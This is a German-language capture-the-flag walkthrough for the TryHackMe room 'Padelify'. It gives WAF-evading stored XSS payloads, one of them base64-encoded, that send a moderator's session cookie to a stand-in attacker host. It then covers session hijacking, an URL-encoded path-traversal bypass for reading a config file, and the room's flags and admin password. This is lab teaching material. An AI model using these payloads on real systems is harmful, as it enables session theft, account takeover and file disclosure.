# Padelify – Komplette Lösung

> **Room:** [https://tryhackme.com/room/padelify](https://tryhackme.com/room/padelify)  
> **Schwierigkeit:** Medium  
> **Thema:** WAF-Bypass (XSS + LFI)

---

## Ziele

| # | Ziel | Flag |
|---|------|------|
| 1 | Login als Moderator | `THM{Logged_1n_Moderat0r}` |
| 2 | Login als Admin | `THM{Logged_1n_Adm1n001}` |

---

## Flag 1 – Moderator (Stored XSS → Cookie-Theft)

### Schritt 1: Recon

**Nmap-Scan:**
```bash
nmap -sC -sV -p- <TARGET_IP>
```
→ Ports: 22 (SSH), 80 (HTTP/Apache)

**Wichtig:** HTTP-Cookie-Flags überprüfen:
```
PHPSESSID: httponly flag not set
```

**Gobuster mit realistischem User-Agent:**
```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -u http://<TARGET_IP> \
  -a "Mozilla/5.0 (Linux; Android 12; ...) Chrome/99.0.4844.88"
```

**Wichtige Pfade gefunden:**
- `/logs/error.log` ✅ lesbar
- `/config/app.conf` ❌ 403 Forbidden
- `/login.php`, `/register.php`, `/dashboard.php`

**error.log durchlesen:**
```
Aug 22 10:45:32 padelify httpd[1234]: WAF: XSS attempt detected in comment (WARNING only)
Aug 22 10:45:33 padelify httpd[1234]: WAF: Encoding sequence detected (LOGGED)
```
→ **Hinweis:** XSS wird gewarnt, nicht geblockt. Encoding kann funktionieren.

### Schritt 2: Registrierungsformular erkunden

1. `/register.php` öffnen
2. Formular-Felder identifizieren: `username`, `email`, `password`
3. Text: *"Your registration request will be reviewed by a moderator"* → **Moderator reviewt manuell!**

### Schritt 3: XSS-Payload vorbereiten

**Blockiert von WAF:**
- `<script>` Tags
- Wort "cookie"
- `<img onerror=...>`
- `fetch()` direkt

**Bypass-Payloads (alle funktionieren):**

**Variante A (einfachste):** iframe + String-Concat
```html
<iframe onload="new Image().src='http://ATTACKBOX:8000/?c='+document['coo'+'kie']">
```

**Variante B:** body + eval(atob)
```html
<body onload="eval(atob('ZmV0Y2goJ2h0dHA6Ly9BVFRBQ0tCT1g6ODAwMC8/Yz0nK2RvY3VtZW50LmNvb2tpZSk='))">
```

**Variante C:** svg + onload
```html
<svg onload="new Image().src='http://ATTACKBOX:8000/?c='+document['coo'+'kie']">
```

### Schritt 4: HTTP-Listener starten

**Auf AttackBox (oder lokal mit Port-Forward):**
```bash
python3 -m http.server 8000
```
→ Port 8000 für Cookie-Callback freigeben

**Mit Python-Script (automatisiert):**
```bash
python padelify_first.py --target <TARGET_IP> --attackbox <ATTACKBOX_IP> --port 8000
```

### Schritt 5: XSS injizieren

1. `/register.php` öffnen
2. Einen der Bypass-Payloads in **Username-Feld** eintragen
3. Email: einen zufälligen Wert eingeben
4. Password: beliebig
5. **Submit**

**Erwartete Antwort:**
```
"Your registration request has been submitted for moderator review."
```

### Schritt 6: Cookie-Callback abfangen

**Warten:** ~30-120 Sekunden, bis Moderator die Registrierung reviewt

**Listener-Output:**
```
================================================
[!!!] COOKIE STOLEN from 10.82.156.227:xxxxx
[!!!] Cookie: PHPSESSID=agvfsgqpudnfn11gckimtrvtr1
================================================
```

### Schritt 7: Mit Moderator-Cookie einloggen

1. Browser DevTools öffnen (F12)
2. Application → Cookies
3. `PHPSESSID` Cookie mit gestohlenom Wert ersetzen
4. `/dashboard.php` neu laden
5. **Flag 1 anzeigen:** `THM{Logged_1n_Moderat0r}`

---

## Flag 2 – Admin (LFI via WAF-Bypass)

**Voraussetzung:** Moderator-Session (Cookie aus Flag 1)

### Schritt 1: LFI-Vektor finden

1. Mit Moderator-Cookie `/dashboard.php` öffnen
2. Im Dashboard auf **"Live"** Link klicken
3. URL analysieren:
   ```
   http://10.82.156.227/live.php?page=match.php
   ```
   → Der `page=` Parameter ist anfällig für **LFI (Local File Inclusion)**

### Schritt 2: LFI-Test (unencoded)

**Direkter Versuch:**
```
/live.php?page=../../config/app.conf
```
→ **403 Forbidden** (WAF blockiert)

### Schritt 3: WAF-Bypass via URL-Encoding

**Trick:** Punkt (`.`) und Slash (`/`) beide encodieren
- `.` → `%2E`
- `/` → `%2F`

**Payload:** `..%2Fconfig%2Fapp%2Econf`
```
/live.php?page=..%2Fconfig%2Fapp%2Econf
```
→ **200 OK – Datei gelesen!**

### Schritt 4: Admin-Passwort extracten

**Response enthält:**
```html
...
version = "1.4.2"
enable_live_feed = true
admin_info = "bL}8,S9W1o44"
...
```

→ **Admin-Passwort: `bL}8,S9W1o44`**

**Mit Script (automatisiert):**
```bash
python padelify_second.py --target <TARGET_IP> --cookie "PHPSESSID=agvfsgqpudnfn11gckimtrvtr1"
```

### Schritt 5: Admin-Login

1. `/login.php` öffnen
2. **Username:** `admin`
3. **Password:** `bL}8,S9W1o44` (oder extrahiert aus app.conf)
4. **Login**
5. **Flag 2 anzeigen:** `THM{Logged_1n_Adm1n001}`

---

## Zusammenfassung der WAF-Bypasses

| Vulnerability | Blockiert | Bypass |
|---|---|---|
| **XSS** | `<script>`, `document.cookie`, `fetch()` | `<iframe onload>` + `document['coo'+'kie']` |
| **LFI** | `../config/app.conf`, `/config/app.conf` | `..%2Fconfig%2Fapp%2Econf` (Punkt + Slash encoden) |
| **UA-Filter** | Gobuster Default-UA | Realistischer User-Agent setzen |
| **HttpOnly** | (nicht vorhanden) | Cookies via XSS auslesbar |

---

## Ressourcen

- **Writeup 1:** [Domoon (Medium)](https://domoon.medium.com/padelify-thm-writeup-f8917e721a48)
- **Writeup 2:** [Avyukt Security (Medium)](https://infosecwriteups.com/padelify-thm-writeup-5f30dd31009f)
- **CRS Bypass Techniques:** [OWASP CRS v3.3.5 Known Issues](https://github.com/coreruleset/coreruleset/issues)

---

## Scripts im Repo

| Script | Verwendung |
|--------|-----------|
| `padelify_first.py` | Automatisiert Flag 1 (Recon + XSS + Cookie-Listener) |
| `padelify_second.py` | Automatisiert Flag 2 (LFI + Admin-Login) |

**Schnell-Kommand:**
```bash
# Flag 1
python padelify_first.py --target 10.82.156.227 --attackbox 10.82.66.140 --port 8000

# Flag 2 (Nach Flag 1, mit neuem Cookie)
python padelify_second.py --target 10.82.156.227 --cookie "PHPSESSID=agvfsgqpudnfn11gckimtrvtr1"
```
